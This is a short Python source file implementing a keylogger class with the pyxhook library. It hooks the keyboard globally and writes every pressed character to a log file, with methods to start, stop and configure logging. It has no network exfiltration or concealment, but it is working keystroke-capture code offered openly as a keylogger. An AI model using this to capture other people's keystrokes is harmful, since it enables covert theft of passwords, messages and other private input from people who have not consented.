import logging
import pyxhook


def _keydown_callback(key: pyxhook.pyxhook.PyxHookKeyEvent):
    """
    The handler for keyboard events

    :param key: The key down event
    """

    logging.debug(chr(key.Ascii))


class Keylogger:
    """ 
    Logs key events to a file
    """

    def __init__(self, filename: str) -> None:
        """
        Constructor

        :param filename: The name for the keylog file
        """

        self.filename = filename

        # Start hook manager
        self.manager = pyxhook.HookManager()

    def log(self) -> None:
        """ 
        Start logging key presses
        """

        # Assign callback for handling key strokes.
        self.manager.KeyDown = _keydown_callback

        # Hook the keyboard and start logging.
        self.manager.HookKeyboard()
        self.manager.start()

    def kill(self) -> None:
        """
        Stops logging key events
        """

        # Stops listening for key events (I think its the correct function?)
        self.manager.cancel()

    def setup(self) -> None:
        """
        Sets up the logging config
        """
        logging.basicConfig(
            level=logging.DEBUG,
            filename=self.filename,
            format='Key: %(message)s',
        )
